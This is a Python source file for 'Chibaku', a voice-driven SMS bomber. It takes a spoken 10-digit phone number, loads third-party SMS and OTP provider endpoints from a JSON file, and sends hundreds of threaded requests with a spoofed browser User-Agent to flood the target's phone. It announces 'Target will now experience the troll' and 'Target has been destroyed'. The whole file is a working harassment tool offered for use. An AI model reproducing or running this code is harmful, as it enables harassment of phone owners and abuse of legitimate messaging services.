import os, sys,random, time, pyttsx3, threading, requests, json
from traceback import print_tb
import speech_recognition as sr

from concurrent.futures import ThreadPoolExecutor, as_completed

engine = pyttsx3.init('sapi5')
voices = engine.getProperty('voices')
engine.setProperty('voice', voices[0].id)

class APIProvider:

    api_providers = []
    delay = 0
    status = True

    def __init__(self, target, delay=0):
        PROVIDERS = json.load(open('./RUNS/assets/apidata.json', 'r'))
        self.config = None
        self.target = target
        self.index = 0
        self.lock = threading.Lock()
        APIProvider.delay = delay
        providers = PROVIDERS.get("sms", {})
        APIProvider.api_providers = providers.get("91", [])
        APIProvider.api_providers += providers.get("multi", [])

    def format(self):
        config_dump = json.dumps(self.config)
        config_dump = config_dump.replace('{target}', self.target)
        self.config = json.loads(config_dump)
    
    def select_api(self):
        try:
            if len(APIProvider.api_providers) == 0:
                raise IndexError
            self.index += 1
            if self.index >= len(APIProvider.api_providers):
                self.index = 0
        except IndexError:
            self.index = -1
            return
        self.config = APIProvider.api_providers[self.index]
        perma_headers = {"User-Agent":
                         "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)"
                         " Gecko/20100101 Firefox/72.0"}
        if "headers" in self.config:
            self.config["headers"].update(perma_headers)
        else:
            self.config["headers"] = perma_headers
        self.format()

    def remove(self):
        try:
            del APIProvider.api_providers[self.index]
            return True
        except Exception:
            return False
    
    def request(self):
        self.select_api()
        if not self.config:
            return None
        identifier = self.config.pop("identifier", "").lower()
        del self.config['name']
        self.config['timeout'] = 10
        response = requests.request(**self.config)
        return identifier in response.text.lower()
    
    def hit(self):
        try:
            if not APIProvider.status:
                return
            time.sleep(APIProvider.delay)
            self.lock.acquire()
            response = self.request()
            if response is False:
                self.remove()
            elif response is None:
                APIProvider.status = False
            return response
        except Exception as e:
            print(f"Error from Hit function\n{e}")
            response = False
        finally:
            self.lock.release()
            return response

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def speak(audio):
    engine.say(audio)
    engine.runAndWait()

def takeCommand():
    r = sr.Recognizer()
    with sr.Microphone() as source:
        print("Listening...")
        r.pause_threshold = 1
        r.adjust_for_ambient_noise(source)
        audio = r.listen(source)
    try:
        print("Recognizing...")
        query = r.recognize_google(audio, language='en-us')
        print(f"User said: {query}\n")
    except Exception as e:
        # print(e)
        print('Sorry, I could not understand. Could you please say that again?')
        return "None"
    return query

def logo():
    clear()
    logo = """
 ▄████████    ▄█    █▄     ▄█  ▀█████████▄     ▄████████    ▄█   ▄█▄ ███    █▄  
███    ███   ███    ███   ███    ███    ███   ███    ███   ███ ▄███▀ ███    ███ 
███    █▀    ███    ███   ███▌   ███    ███   ███    ███   ███▐██▀   ███    ███ 
███         ▄███▄▄▄▄███▄▄ ███▌  ▄███▄▄▄██▀    ███    ███  ▄█████▀    ███    ███ 
███        ▀▀███▀▀▀▀███▀  ███▌ ▀▀███▀▀▀██▄  ▀███████████ ▀▀█████▄    ███    ███ 
███    █▄    ███    ███   ███    ███    ██▄   ███    ███   ███▐██▄   ███    ███ 
███    ███   ███    ███   ███    ███    ███   ███    ███   ███ ▀███▄ ███    ███ 
████████▀    ███    █▀    █▀   ▄█████████▀    ███    █▀    ███   ▀█▀ ████████▀  
                                                           ▀                    
    """
    Dev = "Created By DORTROX"
    print(logo)
    print(Dev)


def get_phone_info():
    while True:
        target = ""
        print("Enter the Phone Number: ")
        speak("Enter the Phone Number: ")
        target = takeCommand()
        print(len(target))
        if " " in target:
                target = target.replace(" ", "")
        print(target)
        print(len(target))
        if ((len(target) < 10) or (len(target) > 10)):
            print(f"The phone number {target} that you have entered is invalid")
            speak(f"The phone number {target} that you have entered is invalid")
            continue
        return (target)

def realTprint(target, Success, failed): 
    logo()
    requested = Success+failed
    message = "On Progress - Please be patient\n"
    message += f"Target          : {target}\n"
    message += f"Sent            : {requested}\n"
    message += f"Successful      : {Success}\n"
    message += f"Failed          : {failed}\n\n"
    message += "Created for flexing\n"
    message += "Chibaku was created by DORTROX"
    print(message)


def workernode(target, count, delay, max_threads):

    logo()
    api = APIProvider(target, delay=delay)
    message = "Gearing up on target\n"
    message += f"Target          : {target}\n"
    message += f"Amount          : {count}\n"
    message += f"Threads         : {max_threads}\n"
    message += f"Delay           : {delay} seconds\n\n"
    message += "Target will now experience the troll"
    print(message)
    speak("Gearing up on target")
    time.sleep(1)
    speak("Target will now experiene the troll")


    Success, failed = 0, 0
    while Success < count:
        with ThreadPoolExecutor(max_workers= max_threads) as executor:
            jobs = []
            for i in range(count-Success):
                jobs.append(executor.submit(api.hit))
            
            for job in as_completed(jobs):
                result = job.result()
                if result is None:
                    print("Error")
                    sys.exit()
                if result:
                    Success +=1
                else:
                    failed += 1
                realTprint(target, Success, failed)
    print("\nTarget has been destroyed")
    speak("Target has been destroyed")
    time.sleep(1.5)
    logo()

def chibaku():
    logo()
    max_limit = 500
    target  = get_phone_info()
    while True:
        try:
            print("Enter the amount of sms to send: ")
            speak("Enter the amount of sms to send: ")
            count = int(takeCommand().lower())
            if count > max_limit or count == 0:
                print(f"You have requested {count}\nAutomatically capping the value: ")
                count = random.range(500)
            print("Enter delay time ( in seconds ): ")
            speak("Enter delay time ( in seconds ): ")
            delay = float(takeCommand().lower())
            if delay < 0:
                print("You delay request {count} is below 0\nAutomatically capping the value: ")
            max_thread_limit = (count//10) if (count//10) > 0 else 1
            print(f"Enter No of threads ( Recommended: {max_thread_limit}): ")
            speak(f"Enter No of threads ( Recommended: {max_thread_limit}): ")
            max_threads = int(takeCommand().lower())
            break
        except:
            pass

    workernode(target, count, delay, max_threads)